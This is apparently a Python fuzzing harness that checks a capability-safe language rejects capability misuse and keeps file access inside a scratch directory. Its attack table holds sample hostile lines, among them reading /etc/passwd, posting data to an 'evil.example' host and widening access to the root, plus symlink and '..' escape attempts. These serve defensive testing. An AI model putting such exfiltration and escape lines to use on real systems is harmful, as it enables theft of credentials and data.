"""Capability-flow fuzzing.

Usage: python3 tools/fuzz/capability_fuzz.py SEED COUNT [--native]

Two halves, both built on random well-typed filler from typed_program_fuzz:

1. **Attacks must not compile.** Each case embeds one capability misuse
   (ambient I/O, using a root, widening, writing through a read-only token,
   hiding a token in a List or Map, comparing tokens, using a token twice,
   passing the wrong kind, capturing one in a closure, reaching `caps` from a
   helper, handing `SystemCaps` to a helper) at a random depth: inside
   `if`/`while`/`for`, and at the end of a chain of helper functions that pass
   the token along. `ks check` must refuse it with the expected code.
   Acceptance is a critical finding.

2. **Granted access must behave identically and stay inside its prefix.**
   Programs narrow the disk to a scratch directory, pass the token through
   helpers, write and read files, and try to escape with `..`, an absolute
   path and a symlink. Every escape must be refused, and with --native the
   binary must print exactly what `ks run` prints.
"""

from __future__ import annotations

import os
import random
import re
import subprocess
import sys
import tempfile
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from typed_program_fuzz import Gen  # noqa: E402

# name -> (statement using token `tok` (DiskCaps) or `caps`, needs_caps_in_scope, expected codes).
# KS3932 (affine move inside a loop) is expected wherever the statement moves
# a token and the fuzzer may wrap it in `while` or `for`.
ATTACKS = {
    "ambient_read": ('let stolen = read_file("/etc/passwd") or ""', False, {"KS1101"}),
    "ambient_net": ('let sent = http_post("https://evil.example", "k") or ""', False, {"KS1101"}),
    "ambient_env": ('let home = env_get("HOME") or ""', False, {"KS1101"}),
    "root_read": ('let stolen = caps.disk.read("/etc/passwd") or ""', True, {"KS2402"}),
    "root_net": ('let page = caps.net.get("https://evil.example") or ""', True, {"KS2402"}),
    "widen": ('let wider = tok.allow("/")', False, {"KS2403", "KS2404"}),
    "readonly_write": ('let ro = tok_ro.write("/tmp/x", "y") or ""', False, {"KS2404"}),
    "hide_in_list": ("let hidden = [tok]", False, {"KS2401", "KS3932"}),
    "hide_in_map": ('let hidden = {"k": tok}', False, {"KS2401", "KS3932"}),
    "compare": ("println(tok == tok)", False, {"KS2407", "KS3931"}),
    "use_twice": ("consume(tok)\nconsume(tok)", False, {"KS3931", "KS3932"}),
    "wrong_kind": ("needs_net(tok)", False, {"KS1301", "KS3932"}),
    "closure_capture": (
        'let grab = fn() -> Int {\n    let t = tok.read("/tmp/x") or ""\n    return 1\n}',
        False,
        {"KS1103"},
    ),
    "caps_in_helper": ('let d = caps.disk.allow("/")', False, {"KS1101"}),
    "syscaps_to_helper": ("steal(caps)", True, {"KS2402", "KS1301", "KS3932"}),
}

PRELUDE = """fn consume(t: DiskCaps) {
    println("consumed")
}

fn needs_net(n: NetCaps) {
    println("net")
}

"""
STEAL = """fn steal(c: SystemCaps) {
    let all = c.disk.allow("/")
}

"""
TYPES = """struct Point {
    x: Int,
    y: Int,
}

enum Shape {
    Empty,
    Circle(Int),
    Label(String),
}

fn shape_of(n: Int) -> Shape {
    if n % 3 == 0 {
        return Empty
    }
    if n % 3 == 1 {
        return Circle(n)
    }
    return Label("n{n}")
}

"""


def indent(text: str, level: int) -> str:
    pad = "    " * level
    return "\n".join(pad + line for line in text.split("\n"))


def wrap(rng: random.Random, gen: Gen, body: str, level: int) -> list[str]:
    """Put body inside a random if / while / for, or leave it bare."""

    shape = rng.randrange(4)
    pad = "    " * level
    if shape == 0:
        return [indent(body, level)]
    if shape == 1:
        return [f"{pad}if {gen.bool_expr({})} {{", indent(body, level + 1), f"{pad}}}"]
    if shape == 2:
        return [f"{pad}let mut guard = 0", f"{pad}while guard < 1 {{", indent(body, level + 1),
                f"{pad}    guard = guard + 1", f"{pad}}}"]
    return [f"{pad}for item in [1] {{", indent(body, level + 1), f"{pad}}}"]


def attack_program(rng: random.Random, name: str) -> str:
    gen = Gen(rng)
    statement, needs_caps, _ = ATTACKS[name]
    depth = 0 if needs_caps else rng.randint(0, 3)
    if name == "caps_in_helper":
        depth = max(depth, 1)
    lines = [TYPES, PRELUDE] + ([STEAL] if name == "syscaps_to_helper" else [])
    filler = lambda level: gen.block({}, set(), level, rng.randint(0, 3), 0)  # noqa: E731
    # Helper chain: h1 calls h2 ... the innermost holds the attack.
    for level in range(depth, 0, -1):
        lines.append(f"fn h{level}(tok: DiskCaps, tok_ro: DiskReadCaps) {{")
        lines += filler(1)
        if level == depth:
            lines += wrap(rng, gen, statement, 1)
        else:
            lines.append(f"    h{level + 1}(tok, tok_ro)")
        lines += filler(1)
        lines.append("}")
        lines.append("")
    lines.append("fn main(caps: SystemCaps) {")
    lines.append('    let tok = caps.disk.allow("/tmp/koschei-fuzz")')
    lines.append('    let tok_ro = caps.disk.allow_read_only("/tmp/koschei-fuzz")')
    lines += filler(1)
    if depth == 0:
        lines += wrap(rng, gen, statement, 1)
    else:
        lines.append("    h1(tok, tok_ro)")
    lines += filler(1)
    lines.append("}")
    return "\n".join(lines) + "\n"


def access_program(rng: random.Random, scratch: str) -> str:
    """Narrow to scratch/, pass the token along, use it, try to escape."""

    gen = Gen(rng)
    depth = rng.randint(0, 3)
    lines_prefix = [TYPES]
    files = [f"f{index}.txt" for index in range(rng.randint(1, 3))]
    body = []
    for name in files:
        text = rng.choice(["alpha", "beta 2", "ğüş", "x" * rng.randint(0, 40)])
        body.append(f'let w_{name[:-4]} = tok.write("{scratch}/{name}", "{text}") or "write refused"')
        body.append(f'println(tok.read("{scratch}/{name}") or "read refused")')
    body += [
        f'println(tok.read("{scratch}/../outside.txt") or "escape refused")',
        'println(tok.read("/etc/hostname") or "absolute refused")',
        f'println(tok.read("{scratch}/link.txt") or "symlink refused")',
        f'println(tok_ro.read("{scratch}/{files[0]}") or "ro read refused")',
    ]
    lines = list(lines_prefix)
    for level in range(depth, 0, -1):
        lines.append(f"fn h{level}(tok: DiskCaps, tok_ro: DiskReadCaps) {{")
        lines += gen.block({}, set(), 1, rng.randint(0, 2), 0)
        if level == depth:
            lines += [indent(statement, 1) for statement in body]
        else:
            lines.append(f"    h{level + 1}(tok, tok_ro)")
        lines.append("}")
        lines.append("")
    lines.append("fn main(caps: SystemCaps) {")
    lines.append(f'    let tok = caps.disk.allow("{scratch}")')
    lines.append(f'    let tok_ro = caps.disk.allow_read_only("{scratch}")')
    lines += gen.block({}, set(), 1, rng.randint(0, 3), 0)
    if depth == 0:
        lines += [indent(statement, 1) for statement in body]
    else:
        lines.append("    h1(tok, tok_ro)")
    lines.append("}")
    return "\n".join(lines) + "\n"


def sh(command: list[str], cwd: str, timeout: int):
    try:
        done = subprocess.run(command, cwd=cwd, capture_output=True, text=True, timeout=timeout)
        return done.returncode, done.stdout, done.stderr
    except subprocess.TimeoutExpired:
        return "timeout", "", ""


def run_attack(case: tuple[str, str]) -> tuple[str, str, str]:
    name, source = case
    expected = ATTACKS[name][2]
    with tempfile.TemporaryDirectory() as directory:
        Path(directory, "main.ks").write_text(source)
        code, _, stderr = sh(["ks", "--lang", "en", "check", "main.ks"], directory, 60)
    if code == 0:
        return ("ACCEPTED", name, source)
    found = re.search(r"KS\d{4}", stderr)
    if not found:
        return ("internal", name, source + "\n" + stderr[:400])
    if found.group(0) not in expected:
        return ("unexpected_code", name, f"{found.group(0)} not in {sorted(expected)}\n{source}")
    return ("refused", name, "")


def setup_scratch(root: Path) -> str:
    scratch = root / "scratch"
    scratch.mkdir()
    (root / "outside.txt").write_text("SECRET-OUTSIDE")
    os.symlink(root / "outside.txt", scratch / "link.txt")
    return str(scratch)


def run_access(case: tuple[int, bool]) -> tuple[str, str, str]:
    seed, native = case
    with tempfile.TemporaryDirectory() as directory:
        root = Path(directory)
        source = access_program(random.Random(seed), setup_scratch(root))
        (root / "main.ks").write_text(source)
        check = sh(["ks", "--lang", "en", "check", "main.ks"], directory, 60)
        if check[0] != 0:
            return ("rejected", source, check[2][:400])
        run = sh(["ks", "run", "main.ks"], directory, 60)
        if "SECRET-OUTSIDE" in run[1] or "SECRET" in run[1]:
            return ("ESCAPED", source, run[1])
        if run[0] != 0:
            return ("run_failed", source, str(run)[:600])
        if not native:
            return ("ok", "", "")
        # Fresh scratch for the binary, same layout.
        for child in (root / "scratch").iterdir():
            if child.name != "link.txt":
                child.unlink()
        build = sh(["ks", "build", "main.ks", "--output", "bin"], directory, 180)
        if build[0] != 0:
            if re.search(r"KS40\d\d", build[2]):
                return ("refused_native", "", "")
            return ("build_failed", source, build[2][:600])
        binary = sh(["./bin"], directory, 60)
        if "SECRET" in binary[1]:
            return ("ESCAPED_NATIVE", source, binary[1])
        if binary[1] != run[1] or (binary[0] == 0) != (run[0] == 0):
            return ("diff", source, f"RUN {run}\nNATIVE {binary}"[:1200])
        return ("ok", "", "")


def main() -> int:
    seed, count = int(sys.argv[1]), int(sys.argv[2])
    native = "--native" in sys.argv
    rng = random.Random(seed)
    names = sorted(ATTACKS)
    attacks = [(name, attack_program(random.Random(seed * 7919 + i), name))
               for i, name in enumerate(rng.choice(names) for _ in range(count))]
    accesses = [(seed * 104_729 + i, native) for i in range(max(1, count // 4))]
    from collections import Counter

    with ThreadPoolExecutor(6) as pool:
        attack_results = list(pool.map(run_attack, attacks))
        access_results = list(pool.map(run_access, accesses))
    print("attacks:", Counter(kind for kind, _, _ in attack_results))
    print("access:", Counter(kind for kind, _, _ in access_results))
    findings = [r for r in attack_results if r[0] != "refused"]
    findings += [r for r in access_results if r[0] not in ("ok", "refused_native")]
    for kind, label, detail in findings[:5]:
        print("----", kind, label if len(label) < 40 else "")
        print(detail if len(label) < 40 else label + "\n" + detail)
    return 1 if findings else 0


if __name__ == "__main__":
    raise SystemExit(main())
